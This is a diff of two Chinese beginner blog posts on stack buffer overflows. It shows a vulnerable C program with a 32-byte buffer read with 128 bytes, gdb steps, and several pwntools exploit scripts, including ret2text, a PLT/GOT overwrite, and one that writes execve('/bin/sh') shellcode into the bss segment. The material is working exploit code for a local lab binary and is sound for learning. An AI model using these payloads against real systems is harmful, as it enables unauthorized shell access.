@@ -4,9 +4,14 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="栈溢出（一）, WindQ">
-    <meta name="description" content="开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。        
-一、栈溢出的概念　　首先我们要知道在计算机内部，一块内存的地址是连续的，是上下连贯的。其次，程序在运行过程中，为了临时存取数据的需要，一般都">
+    <meta name="keywords" content="栈溢出（二）, WindQ">
+    <meta name="description" content="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。
+　　源程序代码如下：     
+#include&amp;lt;stdio.h&gt;
+char str[100];
+void vul()
+{
+ ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -14,7 +19,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>栈溢出（一） | WindQ</title>
+    <title>栈溢出（二） | WindQ</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -258,13 +263,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        栈溢出（一）
+                        栈溢出（二）
                     </div>
                 </div>
             </div>
@@ -399,21 +404,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-03-25
+                    2019-03-27
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.7k
+                        402
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        6 分
+                        1 分
                     </div>
                     
                 
@@ -424,69 +429,53 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h5 id="开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。"><a href="#开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。" class="headerlink" title="开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。"></a>开学第一周接触的，最简单的栈溢出学习，基本属于原理级别，后面涉及一点延迟绑定知识。</h5><a id="more"></a>        
-<h2 id="一、栈溢出的概念"><a href="#一、栈溢出的概念" class="headerlink" title="一、栈溢出的概念"></a>一、栈溢出的概念</h2><p>　　首先我们要知道在计算机内部，一块内存的地址是连续的，是上下连贯的。其次，程序在运行过程中，为了临时存取数据的需要，一般都要分配一些内存空间，通常称这些空间为缓冲区，（操作系统所使用的缓冲区，又被称为“堆栈”，在各个操作进程之间，指令会被临时储存在“堆栈”当中。）当我们定义的数据所需要占用的内存超过了栈的大小时，就会发生栈溢出。   </p>
-<p>　　举个例子，比如我们定义一个C程序的函数：    </p>
-<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   
-<span class="token punctuation">{</span>    
-　　<span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    
-　　<span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
-<span class="token punctuation">}</span>
-</code></pre>
-<p>　　当我们定义了一个32字节的字符串s时，内存中会申请一个32字节的空间来保存这个字符串的数据，但<code>read</code>函数的读取字长参数是128[<code>read</code>函数的三个参数分别是<code>fd</code>（0标准输入，1标准输出），读取起始地址，读取字长]，明显超过了数组的字节长度，32位以后的数据就会“涌出”预留空间，缓冲区内其他部分“进发”，这就是栈溢出。　　　
-　　　</p>
-<h2 id="二、简单的利用"><a href="#二、简单的利用" class="headerlink" title="二、简单的利用　"></a>二、简单的利用　</h2><p>　　任何语言的代码最后都可以转成汇编语言这种“通用语言”。如果用汇编语言去看一个程序的代码，在一个函数调用了另一段函数且运行结束后，会出现<code>ret</code>指令，<code>ret</code>指令会返回到调用者函数（<code>ret</code>指令做的事是：把当前栈顶元素写入<code>rip</code>寄存器），即执行调用者函数Ａ→调用执行某函数Ｂ→Ｂ结束后ret跳转继续执行调用者函数A。如果能够修改存储的ret指令操作的地址值，那就可以操纵这个函数执行完毕后跳转的位置，再如果，我们能将这个地址值修改成一段恶意代码的地址，那么它将会跳转到这段恶意代码的地址上并执行它（当然前提是栈是可执行的，如果开启了NX保护可能就不行了）。</p>
-<p>　　举个简单的例子，有如下Ｃ语言代码：</p>
-<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>　　　　　</span>
-
-<span class="token keyword">void</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>　　　　　
+                <h5 id="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"><a href="#这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。" class="headerlink" title="这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。"></a>这次与上一篇文章的不同的是，原代码中没有自带的恶意代码，这时候我们就要考虑自己填塞一段恶意代码以达到目的。</h5><a id="more"></a>
+<p>　　源程序代码如下：     </p>
+<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
+<span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
-　　<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// "/bin/sh"可执行shell脚本，即执行系统命令</span>
+    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 
-<span class="token keyword">void</span> <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span>　　　　
-<span class="token punctuation">{</span>
-　　<span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-　　<span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//从数组s起始地址开始向后写入128字节　　　　</span>
-<span class="token punctuation">}</span>
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
 <span class="token punctuation">{</span>
-　　<span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">vul</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span>
 </code></pre>
-<p>　　按照之前的说法，我们需要知道 ①数组<code>s</code>起始地址 ②<code>ret</code>指令对应地址 ③两者之间的差（用于填充无关字节使其后的字节处于溢出状态）④<code>shell()</code>函数的地址       </p>
-<p>　　数组<code>s</code>的起始地址可以通过<code>gdb</code>工具调试得来，找到运行<code>read</code>函数的地址即可；<code>ret</code>指令地址基本类似；两者之间的差就是十六进制的加减法，很好算。首先要用<code>gcc</code>工具将c代码编译成二进制可执行文件，然后再通过<code>gdb</code>工具调试。注意，指令应为：<code>gcc xxx.c -o 自定义的可执行文件名 -no-pie</code>。<code>pie</code>是程序随机化保护，不关掉的话每次运行变量函数的地址都不一样，难以攻击。      </p>
-<p>　　关于gdb的使用过程：       </p>
-<pre class=" language-bash"><code class="language-bash">假设可执行文件名为vul（后缀名正常情况下为.o，在此不重要）
-gdb vul
-b vul       <span class="token comment" spellcheck="true">#在vul()函数下断点，（b后按tab会有可选项）可将可执行文件拖入IDA中查看伪代码</span>
-run         <span class="token comment" spellcheck="true">#跑起来</span>
-n           <span class="token comment" spellcheck="true">#即next，向下执行，直到执行到read，记下当前地址（0x7fffffffe090）</span>
-n           <span class="token comment" spellcheck="true">#向下执行，直到执行到ret，当前地址（0x7fffffffe0b8）   </span>
+<p>　　自己填塞恶意代码，容易“跑”，我们需要一块稳定的，持续可用的代码段来供我们使用。这时候首先想到的是<code>bss</code>段，因为<code>bss</code>段通常用来存放程序中未初始化的全局变量，且可读可写。变量一般分为全局变量和局部变量，局部变量的存活时间较短，函数执行完就自动释放了，全局变量则不同，可以被程序内所有的对象或函数引用，相对来说更加稳定，比较适合存放一段恶意代码。<br>　　<code>bss</code>段可读可写不可执行，因此如果我们想进行实验，需要关掉栈保护和数据执行保护，使得<code>bss</code>段的代码变得可以执行。编译命令如下：    </p>
+<pre class=" language-bash"><code class="language-bash">gcc -fno-stack-protector -z execstack -o xxxx xxxx.c
 </code></pre>
-<p>　　<img src="/images/2019-03-19-栈溢出（一）_1.png" alt="这是一个暗搓搓的read示意图">　　　　　　　　<br>  　　　　　　　　　　　　<br>　　<img src="/images/2019-03-19-栈溢出（一）_2.png" alt="这是一个暗搓搓的ret示意图">　　　　　　　　　</p>
-<p>　　接下来就是作差，可得是40，即是两者之间相差40字节，从<code>s</code>处用40个字节可以填充中间数据段，再写就可以溢出，影响<code>ret</code>，影响函数执行后的跳转位置。接下来查看我们“恶意代码”的位置，并将这段地址填入<code>ret</code>中。<code>system(&quot;/bin/shell&quot;);</code>这一段代码是可执行文件里自带的，这样比较简单，比较好找，可以拖入IDA中查看，找到<code>_system</code>，按空格即可找到对应位置，我们的是<code>08048310</code>。因为linux是小端存储，所以将这个地址倒向填入，即<code>\x10\x83\x04\x03\x00\x00\x00\x00</code></p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>              <span class="token comment" spellcheck="true">#pwn即pwntools，一个很好用的库</span>
-io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./vul'</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">#启动程序，形成进程</span>
-payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">40</span> <span class="token operator">+</span> <span class="token string">'\x10\x83\x04\x03\x00\x00\x00\x00'</span>
-raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>                    <span class="token comment" spellcheck="true">#在这卡一下，使程序不会运行的太快以至于？？？</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token comment" spellcheck="true">#弹回一个交互式shell</span>
-</code></pre>
-<p>即可。<br>P.S.　<code>raw_input()</code>　是为了给程序刹个车，不让它走的太快，因为……因为啥我忘了……</p>
-<h2 id="三、另一种办法"><a href="#三、另一种办法" class="headerlink" title="三、另一种办法"></a>三、另一种办法</h2><p>　　还有一种办法是通过延迟绑定技术实现，延迟绑定技术是指#####它的优势是：####### GOT表项的地址对应真实数据，PLT表项的地址对应的是在GOT中的地址。   </p>
-<p>　　攻击脚本如下：</p>
+<p>　　<code>-fno-stack-protector</code>用于关掉栈保护，<code>-z execstack</code>用于关掉数据可执行保护（DEP）。攻击脚本代码如下：</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./vul'</span><span class="token punctuation">)</span>
-payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">44</span> <span class="token operator">+</span> <span class="token string">'\x00\x83\x04\x08'</span> <span class="token operator">+</span> <span class="token string">'\x00\x83\x04\x08'</span> <span class="token operator">+</span> <span class="token string">'\x00\x00\x00\x00'</span> <span class="token operator">+</span> <span class="token string">'\x0c\xA0\x04\x08'</span> <span class="token operator">+</span> <span class="token string">'\x04\x00\x00\x00'</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./vul"</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#io = remote('127.0.0.1', 10001)       #远程</span>
+read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>
+
+
+payload  <span class="token operator">=</span> <span class="token string">"a"</span> <span class="token operator">*</span> <span class="token number">44</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804a040</span><span class="token punctuation">)</span>
+payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>
+
+sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\x3B\x84\x04\x08'</span><span class="token punctuation">)</span>
+
+
+shellcode <span class="token operator">=</span> <span class="token string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>
+
+sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>
+
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
-<p>　　<img src="/images/2019-03-19-栈溢出（一）_3.jpg" alt="这是一个稚嫩又潦草的手绘栈图示">      </p>
-<h4 id="详细阐述一下payload的每个部分和工作运行的细节："><a href="#详细阐述一下payload的每个部分和工作运行的细节：" class="headerlink" title="详细阐述一下payload的每个部分和工作运行的细节："></a>详细阐述一下payload的每个部分和工作运行的细节：</h4><p>（payload由44个a和五个小字符串拼接而成，将五个小字符串标记序号12345，将倒数第二行的标记为6）<br>44个a：老样子，还是填充无关字节到ret<br>字符串1，2：<code>read_plt</code><br>字符串3，4，5：代表read的三个参数(0, read_got, 4)<br>字符串6：shell的地址     </p>
-<h5 id="关于如何查看这几个地址，IDA中按空格键即可。"><a href="#关于如何查看这几个地址，IDA中按空格键即可。" class="headerlink" title="关于如何查看这几个地址，IDA中按空格键即可。"></a>关于如何查看这几个地址，IDA中按空格键即可。</h5><h4 id="read函数总共运行三次"><a href="#read函数总共运行三次" class="headerlink" title="read函数总共运行三次"></a>read函数总共运行三次</h4><p>第一次：通过read函数填充字符串起始位置到ret之间的空间，通过溢出将payload整个部署到ret以及后面的部分上，相当于整体布局的作用。此次运行除了溢出外并无异常。<br>第二次：程序正常运行，一直到字符串read完，开始ret的时候出现异常，因为此时ret所指向的返回地址已经本修改成了<code>read_plt</code>。跳转后执行read，三个参数是(0, read_got, 4)，4的意思是地址只需要4个字节。此时read执行尚未完毕，处于待输入状态，<code>io.send(&#39;\x3B\x84\x04\x08&#39;)</code>将shell的地址输入进去，即：将<code>read_got</code>修改成了shell的地址。<code>read_got→shell</code><br>第三次：到ret时，跳转到<code>read_plt</code>，<code>read_plt</code>指向<code>read_got</code>，这时的<code>read_got</code>已经在上一步中修改成了<code>shell</code>的地址，即：实际上ret跳转是跳到了<code>shell</code>上。<code>read_plt→read_got→shell</code>    </p>
-<h1 id="这样就成功了！！！-3」∠"><a href="#这样就成功了！！！-3」∠" class="headerlink" title="这样就成功了！！！(:3」∠)"></a>这样就成功了！！！<em>(:3」∠)</em></h1>
+<p><img src="/2019/03/27/zhan-yi-chu-er/2019-03-19-栈溢出（一）_1.png" alt="这是一个暗搓搓的read示意图"></p>
+
             </div>
             <hr>
 
@@ -509,7 +498,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </span>
                     <a href="http://windq08.github.io" class="b-link-green">WindQ</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/03/25/zhan-yi-chu-yi/" class="b-link-green">栈溢出（一）</a>
+                    <a href="/2019/03/27/zhan-yi-chu-er/" class="b-link-green">栈溢出（二）</a>
                 </p>
             </div>
         </div>
@@ -532,7 +521,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2019/03/27/zhan-yi-chu-er/">
                     <div class="card-image">
@@ -552,9 +542,9 @@ void vul()
 {
  </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-03-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-03-27
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -567,6 +557,7 @@ void vul()
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -582,7 +573,7 @@ void vul()
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="fa fa-dot-circle-o"></i>
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
                 <a href="/2019/03/25/zhan-yi-chu-yi/">
@@ -613,7 +604,6 @@ void vul()
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
